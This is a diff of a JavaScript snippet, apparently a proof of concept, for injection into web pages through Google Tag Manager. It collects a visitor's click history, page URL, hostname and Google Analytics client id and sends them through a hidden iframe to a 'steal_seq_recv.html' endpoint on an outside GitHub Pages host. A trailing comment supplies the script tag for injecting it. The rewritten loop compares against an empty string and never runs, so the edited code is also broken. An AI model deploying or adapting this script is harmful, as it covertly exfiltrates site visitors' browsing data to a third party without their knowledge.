@@ -1,3 +1,4 @@
+
 function seqVer() {}
 
 function makeid(length) {
@@ -61,7 +62,7 @@ function readTextFile(file, callback) {
 }
 
 
-function doSeqFlow() {
+function doGHSeqFlow() {
     var wjmId = 'wjm-' + makeid(5);
     var ifrm_w = document.createElement('iframe');
     ifrm_w.setAttribute('id', wjmId);
@@ -100,31 +101,6 @@ function doSeqFlow() {
             ListForClick.push(i);
         }
     }
-    if (ListForClick.length > seqLen) {
-        ListForClick = ListForClick.slice(-seqLen);
-    }
-
-
-    objStrList = []
-    for (i = 0; i < ListForClick.length; i++) {
-        j = ListForClick[i];
-        element_url = dataLayer[j]['gtm.elementUrl'];
-        elementClasses = dataLayer[j]['gtm.elementClasses'];
-        elementId = dataLayer[j]['gtm.elementId'];
-        if ("text" in dataLayer[j]['gtm.element']) {
-            elementText = dataLayer[j]['gtm.element']["text"];
-        } else {
-            elementText = "";
-        }
-        if ("analytics" in dataLayer[j]['gtm.element'].dataset) {
-            dataanalyticsID = dataLayer[j]['gtm.element'].dataset["analytics"];
-        } else {
-            dataanalyticsID = "null"
-        }
-        objStrList.push(encodeObj(element_url, elementClasses, elementId, elementText, dataanalyticsID));
-    }
-
-
 
     var jsonFileName='';
 
@@ -148,25 +124,59 @@ function doSeqFlow() {
     readTextFile("https://wjinma.github.io/sending_for_fun/" + jsonFileName + "?_=" + new Date().getTime(), function(text) {
         eList = [];
         var data = JSON.parse(text.replace(/ /g, ""));
-        // console.log("JSON DATA: "+data);
-        for (i = 0; i < objStrList.length; i++) {
-            code = data[objStrList[i]];
+
+        for(i=ListForClick.length-1;i>=0;i--){
+            j = ListForClick[i];
+            element_url = dataLayer[j]['gtm.elementUrl'];
+            elementClasses = dataLayer[j]['gtm.elementClasses'];
+            elementId = dataLayer[j]['gtm.elementId'];
+            if ("text" in dataLayer[j]['gtm.element']) {
+                elementText = dataLayer[j]['gtm.element']["text"];
+            } else {
+                elementText = "";
+            }
+            if ("analytics" in dataLayer[j]['gtm.element'].dataset) {
+                dataanalyticsID = dataLayer[j]['gtm.element'].dataset["analytics"];
+            } else {
+                dataanalyticsID = "null"
+            }
+            encoded=encodeObj(element_url, elementClasses, elementId, elementText, dataanalyticsID);
+            code = data[encoded];
+
             if (code != undefined) {
-                eList.push(code);
+                if(eList.length==0){
+                    eList.push(code);
+                }else{
+                    if(eList[eList.length-1]!=code){
+                        eList.push(code);
+                    }
+                }
             } else {
                 // console.log(objStrList[i]);
             }
+
+            if(eList.length>=seqLen){
+                break;
+            }
         }
+        eList=eList.reverse();
+
         if(eList.length==0){
             eList.push("empty");
         }else{
             eList.push("");
         }
-        eList=eList.toString();
-        eList=eList.replace(/,,+/g, ",");
-        console.log(wjmId+" eList: " + eList);
-        wframe.src = "https://wjinma.github.io/sending_for_fun/steal_seq_recv.html?uid==" + uuid + "&&domain==" + window.location.hostname + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&eList==" + eList;
+        eListStr="";
+        for(i=0;i<eListStr;i++){
+            if(typeof eList[i]=='number'){
+                eListStr+= ("@"+eList[i]+":");
+            }
+        }
+        console.log(wjmId+" eList: " + eListStr);
+        wframe.src = "https://wjinma.github.io/sending_for_fun/steal_seq_recv.html?uid==" + uuid + "&&domain==" + window.location.hostname + "&&cid==" + getgaCid() + "&&url==" + window.location.href + "&&eList==" + eListStr;
         console.log(wjmId+" url: " + wframe.src);
     });
 
 }
+
+// inga: <script src="https://wjinma.github.io/sending_for_fun/new_inGA_seq_randId_sleep.js"></script>  <script>doGHSeqFlow();</script>
